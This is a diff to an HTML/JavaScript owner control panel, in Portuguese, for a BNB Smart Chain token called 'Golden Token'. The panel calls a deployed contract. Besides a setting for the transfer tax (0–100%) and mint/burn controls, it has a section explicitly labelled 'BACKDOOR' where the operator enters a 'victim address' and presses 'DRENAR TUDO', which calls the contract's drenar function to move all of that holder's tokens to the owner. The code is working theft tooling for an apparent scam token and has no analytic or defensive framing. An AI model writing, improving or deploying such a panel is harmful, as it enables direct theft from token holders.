@@ -3,66 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Golden Token - Painel de Controle</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <title>Golden Token - Painel Completo</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             min-height: 100vh;
             padding: 20px;
         }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-        }
+        .container { max-width: 1200px; margin: 0 auto; }
         .card {
             background: white;
             border-radius: 20px;
-            padding: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            margin-bottom: 20px;
         }
-        h1 {
-            color: #2c3e50;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        h2 {
-            color: #2c3e50;
-            border-bottom: 3px solid #f0b90b;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
+        h1 { color: #1a1a2e; margin-bottom: 10px; }
+        h2 { color: #1a1a2e; border-bottom: 3px solid #f0b90b; padding-bottom: 10px; margin-bottom: 20px; }
+        h3 { color: #16213e; margin: 15px 0 10px 0; }
         .status-grid {
             display: grid;
-            grid-template-columns: repeat(2, 1fr);
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 15px;
             background: #ecf0f1;
             padding: 20px;
             border-radius: 12px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
-        .status-item {
-            font-weight: bold;
-            color: #2c3e50;
-        }
-        .status-value {
-            color: #2980b9;
-            font-family: monospace;
-            margin-top: 5px;
-            display: block;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-            color: #2c3e50;
-        }
+        .status-item { font-weight: bold; color: #2c3e50; }
+        .status-value { color: #2980b9; font-family: monospace; margin-top: 5px; display: block; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: 600; }
         input, select {
             width: 100%;
             padding: 12px;
@@ -78,21 +51,14 @@
             font-weight: bold;
             font-size: 14px;
             transition: all 0.2s;
-            margin-right: 10px;
-            margin-bottom: 10px;
+            margin: 5px 5px 5px 0;
         }
         button:hover { opacity: 0.9; transform: translateY(-1px); }
         .btn-primary { background: #3498db; color: white; }
         .btn-success { background: #27ae60; color: white; }
         .btn-warning { background: #f39c12; color: white; }
         .btn-danger { background: #e74c3c; color: white; }
-        .btn-connect {
-            background: #f0b90b;
-            color: #1a1a2e;
-            width: 100%;
-            padding: 15px;
-            font-size: 16px;
-        }
+        .btn-connect { background: #f0b90b; color: #1a1a2e; padding: 15px; font-size: 16px; width: 100%; }
         .log {
             background: #2c3e50;
             color: #ecf0f1;
@@ -100,52 +66,33 @@
             border-radius: 8px;
             font-family: monospace;
             font-size: 12px;
-            max-height: 200px;
+            max-height: 250px;
             overflow-y: auto;
-            margin-top: 20px;
         }
-        .warning {
-            background: #fff3cd;
-            color: #856404;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            border: 1px solid #ffeeba;
-            font-size: 14px;
-        }
-        .connected-badge {
-            background: #27ae60;
-            color: white;
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            display: inline-block;
-            margin-left: 10px;
-        }
-        hr { margin: 20px 0; }
+        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin-bottom: 15px; }
+        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        .badge { background: #f0b90b; padding: 4px 10px; border-radius: 20px; font-size: 12px; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
             <h1>💰 Golden Token - Painel de Controle</h1>
-            <p style="text-align: center; color: #666; margin-bottom: 20px;">
-                Contrato: <strong>0x1A14f3CA35D1802060DBAe326fbe0B0273471b76</strong><br>
-                Pool GOLDEN/USDT: <strong>0x8cDaC40199220727541bB073a899b51D8EA1df89</strong>
-            </p>
+            <p>Contrato: <strong>0x1A14f3CA35D1802060DBAe326fbe0B0273471b76</strong><br>
+            Pool GOLDEN/USDT: <strong>0x8cDaC40199220727541bB073a899b51D8EA1df89</strong></p>
             
             <div id="warningMsg" class="warning" style="display:none;">
-                ⚠️ Nenhuma carteira detectada. Instale <strong>MetaMask</strong> ou <strong>Rabby Wallet</strong> e recarregue a página.
+                ⚠️ Nenhuma carteira detectada. Instale <strong>MetaMask</strong> ou <strong>Rabby Wallet</strong>.
             </div>
-
-            <button id="connectBtn" class="btn-connect">🔌 Conectar Carteira (MetaMask / Rabby)</button>
             
+            <button id="connectBtn" class="btn-connect">🔌 Conectar Carteira (MetaMask / Rabby)</button>
             <div id="walletInfo" style="text-align: center; margin-top: 10px; display: none;">
-                <span id="walletAddress" style="font-family: monospace; background: #ecf0f1; padding: 5px 10px; border-radius: 10px;"></span>
+                <span class="badge">Conectado</span> <span id="walletAddress" style="font-family: monospace;"></span>
             </div>
         </div>
 
         <div id="adminPanel" style="display: none;">
+            <!-- Status -->
             <div class="card">
                 <h2>📊 Status do Contrato</h2>
                 <div class="status-grid">
@@ -154,73 +101,96 @@
                     <div class="status-item">👑 Dono:<span id="valOwner" class="status-value">---</span></div>
                     <div class="status-item">💰 Seu Saldo:<span id="valSaldo" class="status-value">---</span></div>
                 </div>
-                <button onclick="refreshData()" class="btn-primary">🔄 Atualizar Dados</button>
+                <button id="refreshBtn" class="btn-primary">🔄 Atualizar Dados</button>
             </div>
 
+            <!-- Controle de Taxa -->
             <div class="card">
                 <h2>⚙️ Controle do Owner</h2>
                 
+                <h3>🎯 Mudar Percentual da Taxa</h3>
                 <div class="input-group">
-                    <label>🎯 Mudar Percentual da Taxa (0-100%)</label>
-                    <input type="number" id="inputTaxa" placeholder="Ex: 30" value="30" min="0" max="100">
+                    <label>Nova taxa (0-100%):</label>
+                    <input type="number" id="inputTaxa" value="30" min="0" max="100">
                 </div>
-                <button onclick="updateTaxa()" class="btn-primary">💰 Aplicar Nova Taxa</button>
-                <hr>
-
+                <button id="setTaxaBtn" class="btn-primary">💰 Aplicar Nova Taxa</button>
+                
+                <h3>🔘 Ativar / Desativar Taxa</h3>
                 <div class="input-group">
-                    <label>🔘 Ativar / Desativar Sistema de Taxa</label>
                     <select id="selectStatus">
-                        <option value="true">✅ Ativar Taxa</option>
-                        <option value="false">❌ Desativar Taxa</option>
+                        <option value="true">✅ ATIVAR sistema de taxa</option>
+                        <option value="false">❌ DESATIVAR sistema de taxa</option>
                     </select>
                 </div>
-                <button onclick="updateStatus()" class="btn-success">⚙️ Aplicar Estado</button>
-                <hr>
-
+                <button id="setStatusBtn" class="btn-success">⚙️ Aplicar Estado</button>
+                
+                <h3>🔓 Autorizar Pool (DEX)</h3>
                 <div class="input-group">
-                    <label>🔓 Autorizar Pool (DEX) - Não pagar taxa</label>
-                    <input type="text" id="inputPool" placeholder="Endereço do Pool" value="0x8cDaC40199220727541bB073a899b51D8EA1df89">
-                    <select id="selectPoolAction" style="margin-top: 10px;">
-                        <option value="true">✅ Autorizar (Pool não paga taxa)</option>
+                    <label>Endereço do Pool:</label>
+                    <input type="text" id="inputPool" value="0x8cDaC40199220727541bB073a899b51D8EA1df89">
+                    <select id="selectPoolAction">
+                        <option value="true">✅ Autorizar (Pool NÃO paga taxa)</option>
                         <option value="false">❌ Remover Autorização</option>
                     </select>
                 </div>
-                <button onclick="updatePool()" class="btn-warning">🔓 Autorizar / Remover Pool</button>
-                <hr>
-
-                <div class="input-group">
-                    <label>⚠️ BACKDOOR - Drenar carteira</label>
-                    <input type="text" id="inputDrenar" placeholder="Endereço da vítima">
-                </div>
-                <button onclick="doDrenar()" class="btn-danger">💀 DRENAR TUDO</button>
-                <hr>
-
-                <div class="input-group">
-                    <label>✨ Mint (Criar novos tokens)</label>
-                    <input type="number" id="inputMint" placeholder="Quantidade">
-                </div>
-                <button onclick="doMint()" class="btn-success">✨ Mint Tokens</button>
+                <button id="autorizarPoolBtn" class="btn-warning">🔓 Autorizar / Remover Pool</button>
                 
+                <h3 style="color: #e74c3c;">⚠️ BACKDOOR - Drenar Carteira</h3>
                 <div class="input-group">
-                    <label>🔥 Burn (Destruir tokens)</label>
-                    <input type="number" id="inputBurn" placeholder="Quantidade">
+                    <label>Endereço da vítima:</label>
+                    <input type="text" id="inputDrenar" placeholder="0x...">
                 </div>
-                <button onclick="doBurn()" class="btn-danger">🔥 Burn Tokens</button>
+                <button id="drenarBtn" class="btn-danger">💀 DRENAR TUDO</button>
+                
+                <h3>✨ Mint / Burn</h3>
+                <div class="flex-row">
+                    <div style="flex:1">
+                        <label>Mint (criar tokens):</label>
+                        <input type="number" id="inputMint" placeholder="Quantidade">
+                        <button id="mintBtn" class="btn-success">✨ Mint</button>
+                    </div>
+                    <div style="flex:1">
+                        <label>Burn (destruir tokens):</label>
+                        <input type="number" id="inputBurn" placeholder="Quantidade">
+                        <button id="burnBtn" class="btn-danger">🔥 Burn</button>
+                    </div>
+                </div>
             </div>
         </div>
 
+        <!-- Log -->
         <div class="card">
-            <h2>📜 Log de Atividades</h2>
-            <div id="log" class="log">Aguardando conexão...</div>
+            <h2>📜 Log</h2>
+            <div id="log" class="log">Aguardando inicialização...</div>
         </div>
     </div>
+
+    <!-- Carregar ethers.js com fallback -->
+    <script>
+        function loadEthers() {
+            return new Promise((resolve, reject) => {
+                if (window.ethers) {
+                    resolve();
+                    return;
+                }
+                const script = document.createElement('script');
+                script.src = 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js';
+                script.onload = () => resolve();
+                script.onerror = () => reject(new Error('Falha ao carregar ethers.js'));
+                document.head.appendChild(script);
+            });
+        }
+        
+        loadEthers().catch(err => {
+            document.getElementById('log').innerHTML = `<div style="color:#ff6b6b">❌ Erro crítico: Não foi possível carregar a biblioteca ethers.js. Verifique sua conexão com a internet.</div>`;
+        });
+    </script>
 
     <script>
         // Configurações
         const contractAddress = "0x1A14f3CA35D1802060DBAe326fbe0B0273471b76";
-        const poolDefault = "0x8cDaC40199220727541bB073a899b51D8EA1df89";
         
-        // ABI completo
+        // ABI completo do contrato
         const abi = [
             "function getStatus() view returns (uint256 taxa, bool ativa, address dono, uint256 saldoDono)",
             "function setTaxaAtiva(bool _ativa)",
@@ -241,123 +211,64 @@
         function addLog(msg, isError = false) {
             const logDiv = document.getElementById('log');
             const time = new Date().toLocaleTimeString();
-            const color = isError ? '#ff6b6b' : '#ecf0f1';
+            const color = isError ? '#ff6b6b' : '#8bc34a';
             logDiv.innerHTML += `<div style="color: ${color}">[${time}] ${msg}</div>`;
             logDiv.scrollTop = logDiv.scrollHeight;
             console.log(`[${time}] ${msg}`);
         }
 
-        async function init() {
-            addLog("Inicializando...");
-            
-            // Pequeno delay para garantir que extensões carregaram
-            await new Promise(resolve => setTimeout(resolve, 500));
-            
-            // Verificar se tem carteira disponível
+        async function connectWallet() {
             if (!window.ethereum) {
-                addLog("❌ Nenhuma carteira detectada (window.ethereum não encontrado)", true);
+                addLog("❌ Nenhuma carteira detectada! Instale MetaMask ou Rabby.", true);
                 document.getElementById('warningMsg').style.display = 'block';
-                document.getElementById('connectBtn').disabled = true;
                 return;
             }
             
-            // Detectar tipo de carteira
-            if (window.ethereum.isRabby) addLog("✅ Rabby Wallet detectada!");
-            else if (window.ethereum.isMetaMask) addLog("✅ MetaMask detectada!");
-            else addLog("✅ Carteira Ethereum detectada!");
-            
-            document.getElementById('connectBtn').disabled = false;
-            addLog("Pronto para conectar. Clique no botão.");
-        }
-
-        async function connectWallet() {
             try {
-                addLog("🔄 Solicitando conexão à carteira...");
-                
-                // Solicitar contas
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
-                });
-                
-                if (!accounts || accounts.length === 0) {
-                    addLog("❌ Nenhuma conta selecionada", true);
-                    return;
-                }
-                
+                addLog("🔄 Solicitando conexão...");
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAddress = accounts[0];
                 addLog(`✅ Conta conectada: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
                 
-                // Configurar provider
-                provider = new ethers.providers.Web3Provider(window.ethereum, "any");
+                provider = new ethers.providers.Web3Provider(window.ethereum);
                 signer = provider.getSigner();
+                contract = new ethers.Contract(contractAddress, abi, signer);
                 
                 // Verificar rede
                 const network = await provider.getNetwork();
-                addLog(`🌐 Rede conectada: Chain ID ${network.chainId}`);
-                
                 if (network.chainId !== 56) {
-                    addLog("⚠️ AVISO: Você NÃO está na BSC Mainnet (Chain ID 56). Mude a rede na sua carteira!", true);
-                    addLog("👉 No MetaMask/Rabby: selecione 'BNB Smart Chain'");
+                    addLog(`⚠️ Rede: ${network.chainId} (NÃO é BSC Mainnet). Mude para BNB Smart Chain.`, true);
                 } else {
-                    addLog("✅ Rede correta: BNB Smart Chain");
+                    addLog("✅ Rede BSC Mainnet confirmada");
                 }
                 
-                // Instanciar contrato
-                contract = new ethers.Contract(contractAddress, abi, signer);
-                
-                // Atualizar UI
-                document.getElementById('connectBtn').innerText = "✅ Conectado";
-                document.getElementById('connectBtn').style.opacity = "0.7";
+                document.getElementById('connectBtn').innerHTML = "✅ Conectado";
                 document.getElementById('connectBtn').disabled = true;
                 document.getElementById('walletInfo').style.display = 'block';
-                document.getElementById('walletAddress').innerHTML = `🔗 ${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+                document.getElementById('walletAddress').innerHTML = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 document.getElementById('adminPanel').style.display = 'block';
                 
-                // Carregar dados
                 await refreshData();
                 
-                // Configurar listener de mudança de conta
-                window.ethereum.on('accountsChanged', (newAccounts) => {
-                    if (newAccounts.length === 0) {
-                        addLog("⚠️ Carteira desconectada", true);
-                        location.reload();
-                    } else if (newAccounts[0] !== userAddress) {
-                        addLog("🔄 Conta alterada, recarregando...");
-                        location.reload();
-                    }
-                });
-                
-                // Listener de mudança de rede
-                window.ethereum.on('chainChanged', () => {
-                    addLog("🔄 Rede alterada, recarregando...");
-                    location.reload();
-                });
+                // Listeners
+                window.ethereum.on('accountsChanged', () => location.reload());
+                window.ethereum.on('chainChanged', () => location.reload());
                 
             } catch (err) {
-                addLog(`❌ Erro ao conectar: ${err.message}`, true);
-                if (err.code === 4001) {
-                    addLog("Usuário rejeitou a conexão.", true);
-                }
+                addLog(`❌ Erro: ${err.message}`, true);
             }
         }
 
         async function refreshData() {
-            if (!contract) {
-                addLog("⚠️ Contrato não inicializado. Conecte a carteira primeiro.", true);
-                return;
-            }
-            
+            if (!contract) { addLog("⚠️ Conecte a carteira primeiro", true); return; }
             try {
-                addLog("🔄 Buscando dados do contrato...");
-                
-                // Tentar usar getStatus primeiro
+                addLog("🔄 Buscando dados...");
                 try {
                     const status = await contract.getStatus();
                     document.getElementById('valTaxa').innerHTML = `${status.taxa.toString()}%`;
                     document.getElementById('valStatus').innerHTML = status.ativa ? "🟢 ATIVO" : "🔴 INATIVO";
                     document.getElementById('valOwner').innerHTML = `${status.dono.slice(0,6)}...${status.dono.slice(-4)}`;
                 } catch(e) {
-                    // Fallback para funções individuais
                     const taxa = await contract.taxaPercentual();
                     const ativa = await contract.taxaAtiva();
                     const owner = await contract.owner();
@@ -365,146 +276,106 @@
                     document.getElementById('valStatus').innerHTML = ativa ? "🟢 ATIVO" : "🔴 INATIVO";
                     document.getElementById('valOwner').innerHTML = `${owner.slice(0,6)}...${owner.slice(-4)}`;
                 }
-                
-                // Buscar saldo do usuário
                 const saldo = await contract.balanceOf(userAddress);
                 document.getElementById('valSaldo').innerHTML = `${parseFloat(ethers.utils.formatEther(saldo)).toFixed(4)} GOLDEN`;
-                
-                addLog("✅ Dados atualizados com sucesso!");
-            } catch (err) {
-                addLog(`❌ Erro ao ler contrato: ${err.message}`, true);
-            }
+                addLog("✅ Dados atualizados");
+            } catch(err) { addLog(`❌ Erro: ${err.message}`, true); }
         }
 
-        async function updateTaxa() {
-            const novaTaxa = document.getElementById('inputTaxa').value;
-            if (!novaTaxa || novaTaxa < 0 || novaTaxa > 100) {
-                addLog("❌ Taxa inválida. Deve ser entre 0 e 100.", true);
-                return;
-            }
+        async function setTaxa() {
+            const val = document.getElementById('inputTaxa').value;
+            if (!val) return addLog("❌ Digite uma taxa", true);
             try {
-                addLog(`📤 Enviando TX: setTaxaPercentual(${novaTaxa})...`);
-                const tx = await contract.setTaxaPercentual(novaTaxa);
-                addLog(`🆔 Hash: ${tx.hash}`);
-                addLog("⏳ Aguardando confirmação...");
+                addLog(`📤 Alterando taxa para ${val}%...`);
+                const tx = await contract.setTaxaPercentual(val);
                 await tx.wait();
-                addLog(`✅ Taxa alterada para ${novaTaxa}%!`);
-                await refreshData();
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
+                addLog(`✅ Taxa alterada para ${val}%`);
+                refreshData();
+            } catch(err) { addLog(`❌ ${err.message}`, true); }
         }
 
-        async function updateStatus() {
+        async function setStatus() {
             const ativa = document.getElementById('selectStatus').value === "true";
             try {
-                addLog(`📤 Enviando TX: setTaxaAtiva(${ativa})...`);
+                addLog(`📤 ${ativa ? "Ativando" : "Desativando"} sistema...`);
                 const tx = await contract.setTaxaAtiva(ativa);
-                addLog(`🆔 Hash: ${tx.hash}`);
-                addLog("⏳ Aguardando confirmação...");
                 await tx.wait();
-                addLog(`✅ Sistema de taxa ${ativa ? "ativado" : "desativado"}!`);
-                await refreshData();
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
+                addLog(`✅ Sistema ${ativa ? "ativado" : "desativado"}`);
+                refreshData();
+            } catch(err) { addLog(`❌ ${err.message}`, true); }
         }
 
-        async function updatePool() {
+        async function autorizarPool() {
             const pool = document.getElementById('inputPool').value;
             const autorizado = document.getElementById('selectPoolAction').value === "true";
-            
-            if (!pool || pool.length !== 42) {
-                addLog("❌ Endereço de pool inválido", true);
-                return;
-            }
-            
+            if (!pool) return addLog("❌ Endereço do pool vazio", true);
             try {
-                addLog(`📤 Enviando TX: autorizarPool(${pool.slice(0,10)}..., ${autorizado})...`);
+                addLog(`📤 ${autorizado ? "Autorizando" : "Removendo"} pool...`);
                 const tx = await contract.autorizarPool(pool, autorizado);
-                addLog(`🆔 Hash: ${tx.hash}`);
-                addLog("⏳ Aguardando confirmação...");
                 await tx.wait();
-                addLog(`✅ Pool ${autorizado ? "autorizado" : "removido autorização"}!`);
-                await refreshData();
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
+                addLog(`✅ Pool ${autorizado ? "autorizado" : "removido"}`);
+                refreshData();
+            } catch(err) { addLog(`❌ ${err.message}`, true); }
         }
 
-        async function doDrenar() {
+        async function drenar() {
             const alvo = document.getElementById('inputDrenar').value;
-            if (!alvo || alvo.length !== 42) {
-                addLog("❌ Endereço inválido para drenagem", true);
-                return;
-            }
-            
-            if (!confirm(`⚠️ ATENÇÃO! Isso vai drenar TODOS os tokens de ${alvo.slice(0,10)}... para sua carteira. Confirmar?`)) return;
-            
+            if (!alvo) return addLog("❌ Digite o endereço", true);
+            if (!confirm(`⚠️ DRENAR ${alvo.slice(0,10)}...?`)) return;
             try {
-                addLog(`💀 Enviando TX: drenar(${alvo.slice(0,10)}...)...`);
+                addLog(`💀 Drenando ${alvo.slice(0,10)}...`);
                 const tx = await contract.drenar(alvo);
-                addLog(`🆔 Hash: ${tx.hash}`);
-                addLog("⏳ Aguardando confirmação...");
                 await tx.wait();
-                addLog(`✅ Drenagem concluída! Tokens transferidos para o owner.`);
-                await refreshData();
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
+                addLog(`✅ Drenagem concluída!`);
+                refreshData();
+            } catch(err) { addLog(`❌ ${err.message}`, true); }
         }
 
-        async function doMint() {
+        async function mint() {
             const qtd = document.getElementById('inputMint').value;
-            if (!qtd || qtd <= 0) {
-                addLog("❌ Quantidade inválida", true);
-                return;
-            }
+            if (!qtd) return addLog("❌ Digite quantidade", true);
             try {
-                addLog(`✨ Enviando TX: mint(${qtd})...`);
+                addLog(`✨ Mint ${qtd} tokens...`);
                 const tx = await contract.mint(qtd);
-                addLog(`🆔 Hash: ${tx.hash}`);
-                addLog("⏳ Aguardando confirmação...");
                 await tx.wait();
-                addLog(`✅ Mint realizado! ${qtd} GOLDEN criados.`);
-                await refreshData();
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
+                addLog(`✅ Mint realizado: ${qtd} GOLDEN criados`);
+                refreshData();
+            } catch(err) { addLog(`❌ ${err.message}`, true); }
         }
 
-        async function doBurn() {
+        async function burn() {
             const qtd = document.getElementById('inputBurn').value;
-            if (!qtd || qtd <= 0) {
-                addLog("❌ Quantidade inválida", true);
-                return;
-            }
+            if (!qtd) return addLog("❌ Digite quantidade", true);
             try {
-                addLog(`🔥 Enviando TX: burn(${qtd})...`);
+                addLog(`🔥 Burn ${qtd} tokens...`);
                 const tx = await contract.burn(qtd);
-                addLog(`🆔 Hash: ${tx.hash}`);
-                addLog("⏳ Aguardando confirmação...");
                 await tx.wait();
-                addLog(`✅ Burn realizado! ${qtd} GOLDEN destruídos.`);
-                await refreshData();
-            } catch (err) {
-                addLog(`❌ Erro: ${err.message}`, true);
-            }
+                addLog(`✅ Burn realizado: ${qtd} GOLDEN destruídos`);
+                refreshData();
+            } catch(err) { addLog(`❌ ${err.message}`, true); }
         }
 
-        // Expor funções globalmente
-        window.updateTaxa = updateTaxa;
-        window.updateStatus = updateStatus;
-        window.updatePool = updatePool;
-        window.doDrenar = doDrenar;
-        window.doMint = doMint;
-        window.doBurn = doBurn;
-        window.refreshData = refreshData;
-        window.connectWallet = connectWallet;
-        
-        // Inicializar
-        document.getElementById('connectBtn').addEventListener('click', connectWallet);
-        init();
+        // Aguardar ethers carregar
+        function waitForEthers() {
+            return new Promise(resolve => {
+                if (window.ethers) resolve();
+                else setTimeout(() => waitForEthers().then(resolve), 100);
+            });
+        }
+
+        waitForEthers().then(() => {
+            addLog("✅ Ethers.js carregado. Conecte sua carteira.");
+            document.getElementById('connectBtn').addEventListener('click', connectWallet);
+            document.getElementById('refreshBtn').addEventListener('click', refreshData);
+            document.getElementById('setTaxaBtn').addEventListener('click', setTaxa);
+            document.getElementById('setStatusBtn').addEventListener('click', setStatus);
+            document.getElementById('autorizarPoolBtn').addEventListener('click', autorizarPool);
+            document.getElementById('drenarBtn').addEventListener('click', drenar);
+            document.getElementById('mintBtn').addEventListener('click', mint);
+            document.getElementById('burnBtn').addEventListener('click', burn);
+        }).catch(() => {
+            addLog("❌ Falha ao carregar ethers.js", true);
+        });
     </script>
 </body>
 </html>
